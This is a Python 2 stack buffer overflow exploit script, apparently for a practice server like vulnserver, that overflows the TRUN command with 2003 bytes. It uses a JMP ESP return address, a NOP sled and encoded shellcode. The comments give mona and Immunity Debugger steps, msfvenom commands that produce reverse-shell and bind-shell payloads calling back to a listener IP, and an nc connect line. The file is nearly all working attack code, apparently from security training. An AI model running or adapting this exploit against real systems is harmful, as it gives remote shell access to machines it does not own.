#!/usr/bin/python
import sys, socket

#mona
#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#JMP ESP 


#!mona modules 

#!mona find -s "\xff\xe4" -m modules_found

#copy the return address 

#search the return addr in immunity with blue button, check id it match with jmp esp code (ffe4) 
#and set a break point with f2. Run again the progam and check if EIP was really rewritten


#return address 62 50 11 AF => \xaf\x11\x50\x62
#return address 0x625011bb

#common bad char "\x00\x0A\x0D"

#shell
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00" -e x86/shikata_ga_nai

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.1 LPORT=4444 EXITFUNC=thread -e x86/alpha_upper -b "\x00" -f c
#msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.51 LPORT=1234 EXITFUNC=thread -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai

#msfvenom -p windows/shell_bind_tcp LPORT=1234 -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 3 -f python

#nc -nv 192.168.1.11 1234

pwn=("\xda\xd2\xbf\x60\xab\x9e\xa3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\x8b\x57\x7c\x56\xb7\x40\x03"
"\x99\x47\x91\x64\x13\xa2\xa0\xa4\x47\xa7\x93\x14\x03\xe5\x1f"
"\xde\x41\x1d\xab\x92\x4d\x12\x1c\x18\xa8\x1d\x9d\x31\x88\x3c"
"\x1d\x48\xdd\x9e\x1c\x83\x10\xdf\x59\xfe\xd9\x8d\x32\x74\x4f"
"\x21\x36\xc0\x4c\xca\x04\xc4\xd4\x2f\xdc\xe7\xf5\xfe\x56\xbe"
"\xd5\x01\xba\xca\x5f\x19\xdf\xf7\x16\x92\x2b\x83\xa8\x72\x62"
"\x6c\x06\xbb\x4a\x9f\x56\xfc\x6d\x40\x2d\xf4\x8d\xfd\x36\xc3"
"\xec\xd9\xb3\xd7\x57\xa9\x64\x33\x69\x7e\xf2\xb0\x65\xcb\x70"
"\x9e\x69\xca\x55\x95\x96\x47\x58\x79\x1f\x13\x7f\x5d\x7b\xc7"
"\x1e\xc4\x21\xa6\x1f\x16\x8a\x17\xba\x5d\x27\x43\xb7\x3c\x20"
"\xa0\xfa\xbe\xb0\xae\x8d\xcd\x82\x71\x26\x59\xaf\xfa\xe0\x9e"
"\xd0\xd0\x55\x30\x2f\xdb\xa5\x19\xf4\x8f\xf5\x31\xdd\xaf\x9d"
"\xc1\xe2\x65\x31\x91\x4c\xd6\xf2\x41\x2d\x86\x9a\x8b\xa2\xf9"
"\xbb\xb4\x68\x92\x56\x4f\xfb\x5d\x0e\xcd\xfa\x35\x4d\xd1\xf8"
"\x17\xd8\x37\x6a\x88\x8d\xe0\x03\x31\x94\x7a\xb5\xbe\x02\x07"
"\xf5\x35\xa1\xf8\xb8\xbd\xcc\xea\x2d\x4e\x9b\x50\xfb\x51\x31"
"\xfc\x67\xc3\xde\xfc\xee\xf8\x48\xab\xa7\xcf\x80\x39\x5a\x69"
"\x3b\x5f\xa7\xef\x04\xdb\x7c\xcc\x8b\xe2\xf1\x68\xa8\xf4\xcf"
"\x71\xf4\xa0\x9f\x27\xa2\x1e\x66\x9e\x04\xc8\x30\x4d\xcf\x9c"
"\xc5\xbd\xd0\xda\xc9\xeb\xa6\x02\x7b\x42\xff\x3d\xb4\x02\xf7"
"\x46\xa8\xb2\xf8\x9d\x68\xd2\x1a\x37\x85\x7b\x83\xd2\x24\xe6"
"\x34\x09\x6a\x1f\xb7\xbb\x13\xe4\xa7\xce\x16\xa0\x6f\x23\x6b"
"\xb9\x05\x43\xd8\xba\x0f")

buf =  b""
buf += b"\xbf\x9c\x3d\x72\xda\xd9\xc3\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x60\x83\xc2\x04\x31\x7a\x10\x03\x7a\x10\x7e"
buf += b"\xc8\xa9\x01\xa7\x47\x6a\x42\xe9\x89\xa1\xf4\xfd\x92"
buf += b"\x74\xc0\x4c\x7b\x46\xa2\xb4\x7f\xd8\x58\x4b\xbf\x1c"
buf += b"\xbf\x9f\x2b\x6e\xe1\xd0\x2e\xc5\xcb\xd8\xc0\xa7\xe0"
buf += b"\xb7\x39\x6b\x6d\xc7\x4b\x7b\xee\xd2\xe3\xe9\x8c\x8b"
buf += b"\xeb\xad\xf4\x58\xd7\x41\x9f\x01\xe1\xd3\x8e\xeb\x4c"
buf += b"\xdc\x0a\x21\x20\xbe\xf3\x09\x0f\x81\x4e\xfb\xaa\xd5"
buf += b"\xf4\x3c\x0d\x44\x9c\x75\x56\x9f\xeb\xad\x1d\xf2\xda"
buf += b"\x94\x67\x29\x72\xf9\xe1\x32\x47\x8c\xd6\xea\x98\xfd"
buf += b"\x03\x83\x30\x97\x1d\x11\x89\xed\x67\xb9\x80\xee\xd0"
buf += b"\xd7\x54\xcb\x9b\x40\xd4\xf6\xe3\x0b\x18\xdc\x25\x8a"
buf += b"\x0a\xd5\xd5\x5e\x89\x8e\x17\xcc\xda\x64\x4b\x9d\xca"
buf += b"\x6f\xa6\x17\x9c\x42\x64\xed\xf5\x11\x04\x54\x51\xdc"
buf += b"\x78\xa9\x6c\xf0\x28\x2a\x6d\x4f\xa1\x0f\x71\x24\x66"
buf += b"\x5e\xb6\xcf\xbf\xbb\xe8\x1c\x70\x8b\xc7\xba\x02\x39"
buf += b"\x99\x1f\x42\x29\x6d\xf6\xfd\x32\x52\x9a\x0c\x20\x73"
buf += b"\x5d\xb7\x50\xbb\xf6\x1e\xa9\x06\x51\xbb\x41\xdd\xcd"
buf += b"\x79\x5c\x11\xd6\x77\xac\xf0\x77\x76\x80\x7f\xce\xd2"
buf += b"\x1e\x72\x43\xa9\xb5\x39\xd6\x41\x75\x2c\x42\x03\x84"
buf += b"\x7b\x95\x34\x80\x3e\xaa\x10\x2a\xc1\x3a\x88\xc1\x7f"
buf += b"\xff\xd0\x1a\xe7\x1d\xbd\xf4\x8d\x8a\x75\x53\xb2\x3f"
buf += b"\x4f\x0e\x8c\x4a\xba\x23\xb8\xe4\xd3\x04\x60\x9b\x61"
buf += b"\x8c\x01\x20\x0f\x3e\x39\x14\x65\x1f\x1d\x64\x7c\xd7"
buf += b"\x43\xc2\x82\xdb\x5d\xa6\x0d\xff\x31\x1b\xa7\x0c\x1b"
buf += b"\x05\xd1\x01\x2b\xf8\x82\x38\xbc\xf2\xb5\x09\x93\x58"
buf += b"\x6b\x90\x2f\xc4\xc4\x2e\x9c\x5e\x2b\x48\x46\x2c\xa1"
buf += b"\x96\xea\xb8\x82\xcc\x9a\xbe\x19\x11\xb9\xe4\x06\x0b"
buf += b"\x55\x4a\x1c\x1b\xfb\xb7\xd5\x59\x10\x8e\x6b\xfa\x7e"
buf += b"\xfa\x9c\x0b\x99\xbf\xdf\xd1\xb1\x92\x5e\x1d\x39\xb6"
buf += b"\xa1\x10\xe1\x3f\x64\x30\xb8\x6a\x5d\xfd\xa7\xc4\xea"
buf += b"\xdb\x9b\x17\xf7\x0f\x4f"


shellcode="A"*2003 + "\xaf\x11\x50\x62" + "\x90" *16 + buf
try: 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.130.139',9999)) 
	s.recv(1024)
	s.send(('TRUN /.:/' + shellcode)) 

	s.close()

except:

	print "Error connecting to the server" 
	sys.exit()


